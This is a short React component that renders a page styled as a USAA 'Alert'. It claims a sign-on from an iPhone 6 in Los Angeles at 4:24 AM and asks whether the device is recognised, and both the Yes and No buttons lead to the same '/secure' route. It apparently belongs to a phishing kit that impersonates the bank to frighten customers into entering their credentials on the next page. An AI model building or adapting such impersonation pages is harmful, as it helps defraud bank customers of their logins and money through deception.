import { Box, Text, Image, Heading, Center, Button, Link } from '@chakra-ui/react'

function Security() {
  return (
    <Box>
    
      <Box minH="72.3vh">
        
        <Box  >
        <Center p={4} bgColor="whitesmoke" justifyContent="space-between">
          <Text pl={2} fontSize="md" color="#196999" fontWeight="semibold">
          We recognize this device.
          </Text>
          <Text textDecor={'underline'} pl={2} fontSize="md" color="#196999" fontWeight="semibold"><a href='#'>
           View</a>
          </Text>
        </Center>
            <Center>
            <Image mt={10} w={120} src={'./images/lert.svg'} />
            
            </Center>
            <Box>
          <Heading px={4} fontFamily={'serif'} textAlign="center" pt={7} fontWeight="semibold" as="h2" fontSize="26" color="blackAlpha.800">
            Alert
          </Heading>
        </Box>
            <Text textAlign={'center'} fontWeight={'semibold'} mt={4} p={4} fontSize="15px" color="blackAlpha.800">
                          You've signed on to USAA via iPhone 6 located in Los Angeles, California, today at<br /> 4:24 AM. 
                        </Text>
                        <Text fontWeight={'semibold'} textAlign={'center'} mt={4} p={4} fontSize="15px" color="blackAlpha.800">
                          Do you recognize this device?
                        </Text>
        </Box>          
          <Box p={4}>
            <Link href='/secure'>
          <Button mt={0} mb={4} h={12}  _hover={{ bg: '#526f30', color: 'whitesmoke', borderRadius: 2 }}  bgColor="#486428" color="whitesmoke" borderRadius={2} w="100%">
            Yes
          </Button>
          </Link>
          <Link href='/secure'>
          <Button mt={2} h={12}  _hover={{ bg: '#526f30', color: 'whitesmoke', borderRadius: 2 }}  bgColor="#486428" color="whitesmoke" borderRadius={2} w="100%">
            No
          </Button>
          </Link>
          </Box>
        </Box>
      </Box>
   
  )
}

export default Security;
